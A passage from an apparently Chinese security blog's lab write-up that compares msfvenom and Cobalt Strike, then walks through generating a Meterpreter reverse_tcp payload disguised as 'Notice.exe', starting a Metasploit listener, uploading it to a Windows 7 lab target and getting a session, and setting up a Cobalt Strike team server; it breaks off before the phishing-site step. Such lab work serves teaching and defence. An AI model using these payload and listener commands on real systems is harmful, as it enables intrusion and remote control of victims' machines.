&lt;p&gt;通过社会工程学（如钓鱼邮件）将 &lt;code&gt;payload.exe&lt;/code&gt; 投递到目标机器。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;目标运行后，会在其机器上建立一个与攻击者 Metasploit 监听器（&lt;code&gt;multi/handler&lt;/code&gt;）的连接。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;攻击者获得一个 &lt;strong&gt;Meterpreter&lt;/strong&gt; shell，可以进行基本的后期利用。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;特点：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;免费且开源。&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;功能单一但强大&lt;/strong&gt;，专注于载荷生成。&lt;/li&gt;
&lt;li&gt;通常需要与 &lt;strong&gt;Metasploit Framework&lt;/strong&gt; 的其他模块（如监听器、利用模块）配合使用。&lt;/li&gt;
&lt;li&gt;在绕过现代EDR/AV方面能力有限，生成的载荷容易被高级安全软件检测。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="cobalt-strike"&gt;Cobalt Strike
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;定义：&lt;/strong&gt; Cobalt Strike 是一个 &lt;strong&gt;商业的、综合性的红队和对手模拟平台&lt;/strong&gt;。它远不止一个载荷生成器，而是一个集成了 &lt;strong&gt;指挥与控制、钓鱼攻击、横向移动、权限提升、报告生成&lt;/strong&gt; 等功能的完整作战系统。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;主要功能：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;高级攻击载荷：&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Beacon：&lt;/strong&gt; Cobalt Strike 的核心载荷，是一个高度可定制的、隐蔽的“心跳”代理。支持多种通信协议（HTTP/HTTPS, DNS, SMB）和回调方式。&lt;/li&gt;
&lt;li&gt;生成经过高度混淆、签名、或利用各种技术（如进程注入、模块反射式加载）的 Beacon 载荷，以绕过杀毒软件和终端检测与响应（EDR）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;图形化指挥与控制：&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;所有上线的被控主机（Beacon）都在一个直观的图形界面中显示，可以分组、打标签。&lt;/li&gt;
&lt;li&gt;通过右键菜单或命令，轻松向任何 Beacon 发送指令（文件操作、截图、键盘记录、提权等）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;内网横向移动：&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;端口扫描&lt;/strong&gt;和&lt;strong&gt;服务发现&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;凭据转储&lt;/strong&gt;（从内存中提取密码哈希和票据）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;哈希传递&lt;/strong&gt;、&lt;strong&gt;票据传递&lt;/strong&gt; 攻击。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;SMB Beacon&lt;/strong&gt; 用于穿透没有直接外网连接的内部网络节点。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;鱼叉式网络钓鱼：&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;内置模板和服务器，可以方便地创建和管理钓鱼邮件活动，追踪点击和载荷执行情况。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Malleable C2 配置文件：&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;这是 Cobalt Strike 的灵魂功能。允许操作员 &lt;strong&gt;完全自定义 Beacon 的通信模式&lt;/strong&gt;（如模拟成 Google、CloudFlare 等合法服务的流量），极大地增强了隐蔽性和对抗网络流量分析的能力。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;团队协作：&lt;/strong&gt; 支持多个操作员同时连接到一个团队服务器，协同工作。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;报告与日志：&lt;/strong&gt; 自动记录所有操作，便于生成最终的攻击报告。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;典型工作流程：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;红队启动 &lt;strong&gt;Cobalt Strike 团队服务器&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;操作员使用 &lt;strong&gt;Cobalt Strike 客户端&lt;/strong&gt; 连接。&lt;/li&gt;
&lt;li&gt;使用 &lt;strong&gt;“攻击”-&amp;gt;“生成Payload”&lt;/strong&gt; 创建一个高度定制的 Beacon（例如，使用 Malleable C2 配置文件模拟正常流量）。&lt;/li&gt;
&lt;li&gt;通过 &lt;strong&gt;鱼叉式钓鱼&lt;/strong&gt; 或利用其他漏洞投递 Beacon。&lt;/li&gt;
&lt;li&gt;目标上线后，在可视化地图上看到新主机。&lt;/li&gt;
&lt;li&gt;操作员通过 Beacon 进行信息收集，利用内置工具进行凭据转储，然后在内网横向移动，逐步控制更多关键资产。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;特点：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;商业软件&lt;/strong&gt;，价格昂贵，但功能极其强大。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;高度集成化和自动化&lt;/strong&gt;，将红队行动的各个阶段无缝衔接。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;以隐匿和对抗现代安全防御为核心设计&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;是 &lt;strong&gt;高级持续性威胁（APT）模拟&lt;/strong&gt; 和 &lt;strong&gt;成熟红队&lt;/strong&gt; 的首选工具。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="环境配置"&gt;环境配置
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;虚拟环境&lt;/strong&gt;：VMware Workstation 17 Pro - 17.0.0 build-20800274&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;靶机&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;系统&lt;/strong&gt;：Windows 7 Enterprise x64&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;CPU&lt;/strong&gt;：11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz (2.30 GHz)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;网络&lt;/strong&gt;：LAN（IPv4:10.0.0.17/SubnetMask:255.255.255.0/Gateway:NULL/DNS:NULL）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;攻击机&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;系统&lt;/strong&gt;：Linux kali 6.12.25-amd64&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;CPU&lt;/strong&gt;：11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz (2.30 GHz)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;网络&lt;/strong&gt;：LAN（IPv4:10.0.0.223/SubnetMask:255.255.255.0/Gateway:NULL/DNS:NULL）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="实践步骤"&gt;实践步骤
&lt;/h2&gt;&lt;h3 id="mfs恶意程序利用"&gt;MFS恶意程序利用
&lt;/h3&gt;&lt;h4 id="使用msfvenom制作恶意软件"&gt;使用msfvenom制作恶意软件
&lt;/h4&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;span class="lnt"&gt;6
&lt;/span&gt;&lt;span class="lnt"&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;root㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─# msfvenom -p windows/meterpreter/reverse_tcp &lt;span class="nv"&gt;LHOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;10.0.0.223 &lt;span class="nv"&gt;LPORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4448&lt;/span&gt; -f exe &amp;gt; Notice.exe
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;-&lt;span class="o"&gt;]&lt;/span&gt; No platform was selected, choosing Msf::Module::Platform::Windows from the payload
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;-&lt;span class="o"&gt;]&lt;/span&gt; No arch selected, selecting arch: x86 from the payload
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;No encoder specified, outputting raw payload
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Payload size: &lt;span class="m"&gt;354&lt;/span&gt; bytes
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Final size of exe file: &lt;span class="m"&gt;73802&lt;/span&gt; bytes
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;文件存储于&lt;code&gt;/root/Notice.exe&lt;/code&gt;&lt;/p&gt;
&lt;h4 id="制作监听程序"&gt;制作监听程序
&lt;/h4&gt;&lt;p&gt;监听程序的制作过程与&lt;a class="link" href="https://leuco-yuu.github.io/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#%E5%88%A9%E7%94%A8windows%E6%9C%8D%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81" target="_blank" rel="noopener"
&gt;Metasploit持久化后门攻击&lt;/a&gt;相同：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 &amp;gt; use exploit/multi/handler
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Using configured payload generic/shell_reverse_tcp
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; payload windows/meterpreter/reverse_tcp
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; windows/meterpreter/reverse_tcp
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; LHOST 10.0.0.223
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;LHOST&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; 10.0.0.223
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; LPORT &lt;span class="m"&gt;4448&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;LPORT&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="m"&gt;4448&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; run
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Started reverse TCP handler on 10.0.0.223:4448
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id="将恶意程序传输下载到靶机"&gt;将恶意程序传输下载到靶机
&lt;/h4&gt;&lt;p&gt;这里通过&lt;a class="link" href="https://leuco-yuu.github.io/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#metasploit%E6%89%AB%E6%8F%8F%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8" target="_blank" rel="noopener"
&gt;MS17-010漏洞与Metasploit&lt;/a&gt;实现恶意程序的&lt;a class="link" href="https://leuco-yuu.github.io/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#3-%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96%E4%B8%8E%E4%B8%8A%E4%BC%A0" target="_blank" rel="noopener"
&gt;upload&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; upload /root/Notice.exe &amp;gt; C:&lt;span class="se"&gt;\\&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Uploading : /root/Notice.exe -&amp;gt; C:&lt;span class="se"&gt;\N&lt;/span&gt;otice.exe
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Completed : /root/Notice.exe -&amp;gt; C:&lt;span class="se"&gt;\N&lt;/span&gt;otice.exe
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id="等待靶机执行恶意程序"&gt;等待靶机执行恶意程序
&lt;/h4&gt;&lt;p&gt;监听器获取到用户权限&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Sending stage &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;177734&lt;/span&gt; bytes&lt;span class="o"&gt;)&lt;/span&gt; to 10.0.0.17
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Meterpreter session &lt;span class="m"&gt;1&lt;/span&gt; opened &lt;span class="o"&gt;(&lt;/span&gt;10.0.0.223:4448 -&amp;gt; 10.0.0.17:49864&lt;span class="o"&gt;)&lt;/span&gt; at 2026-01-03 08:00:49 +0000
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; getuid
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Server username: Ankh-PC&lt;span class="se"&gt;\A&lt;/span&gt;nkh
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id="cs钓鱼网站制作"&gt;CS钓鱼网站制作
&lt;/h3&gt;&lt;p&gt;为了克隆网站，虚拟机需要联网。这里设置靶机和Kali的网络连接模式为NAT模式，两者通过DHCP自动获取IP地址。此时Win7的IP地址为192.168.10.147/24；Kali的IP地址为192.168.10.135/24。两者之间与宿主机相互ping通并可以正常访问互联网&lt;/p&gt;
&lt;h4 id="cobalt-strike安装"&gt;Cobalt Strike安装
&lt;/h4&gt;&lt;p&gt;将&lt;a class="link" href="cobalt_strike_4.5.zip" &gt;cobalt_strike_4.5.zip&lt;/a&gt;下载至Kali并解压&lt;/p&gt;
&lt;h4 id="更改cs读写权限"&gt;更改CS读写权限
&lt;/h4&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;root㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;/home/kali/Desktop/Tools/Cobalt Strike&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─# &lt;span class="nb"&gt;cd&lt;/span&gt; coablt_strike_4.5
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;root㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;/home/…/Desktop/Tools/Cobalt Strike/coablt_strike_4.5&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─# chmod &lt;span class="m"&gt;777&lt;/span&gt; *
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;chmod&lt;/strong&gt; = &lt;strong&gt;ch&lt;/strong&gt;ange &lt;strong&gt;mod&lt;/strong&gt;e（改变模式）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;777&lt;/strong&gt; = 权限的数字表示法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;第一个数字&lt;/strong&gt;：文件所有者（owner）的权限&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;第二个数字&lt;/strong&gt;：所属用户组（group）的权限&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;第三个数字&lt;/strong&gt;：其他用户（others）的权限&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;每个数字由三个权限值相加组成：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;4&lt;/strong&gt; = 读取权限（Read）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;2&lt;/strong&gt; = 写入权限（Write）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;1&lt;/strong&gt; = 执行权限（eXecute）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;777 的具体含义：&lt;code&gt;7 = 4 + 2 + 1&lt;/code&gt;，即拥有所有权限&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;所有者&lt;/strong&gt;：读 + 写 + 执行（7）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;所属组&lt;/strong&gt;：读 + 写 + 执行（7）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;其他用户&lt;/strong&gt;：读 + 写 + 执行（7）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id="生成cobalt-strike服务器组"&gt;生成Cobalt Strike服务器组
&lt;/h4&gt;&lt;p&gt;设置服务器IP和密码（CS服务器在kali的50050端口监听），创建组服务器实例&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;span class="lnt"&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;root㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;/home/…/Desktop/Tools/Cobalt Strike/coablt_strike_4.5&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─# ./teamserver 192.168.10.135 admin
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Will use existing X509 certificate and keystore &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; SSL&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Team server is up on 0.0.0.0:50050
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; SHA256 &lt;span class="nb"&gt;hash&lt;/span&gt; of SSL cert is: 7eac4fdf25b2e55d39a7d9fcccc00978b95a7639a78a2c893bd2f6aac3637fb8
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Listener: Listener started!
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id="打开cobalt-strike客户端并连接服务器组"&gt;打开Cobalt Strike客户端并连接服务器组
&lt;/h4&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;root㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;/home/…/Desktop/Tools/Cobalt Strike/coablt_strike_4.5&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─# ./cobaltstrike
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;打开Cobal Strike，用刚才设置的密码和IP连接到用户组。Cobalt Strike支持多设备同时登录服务器。&lt;/p&gt;
&lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/1.png"
width="451"
height="336"
srcset="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/1_hu_dfd277f9c3886724.png 480w, http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/1_hu_7adff82c56280f88.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="134"
data-flex-basis="322px"
&gt;&lt;/p&gt;
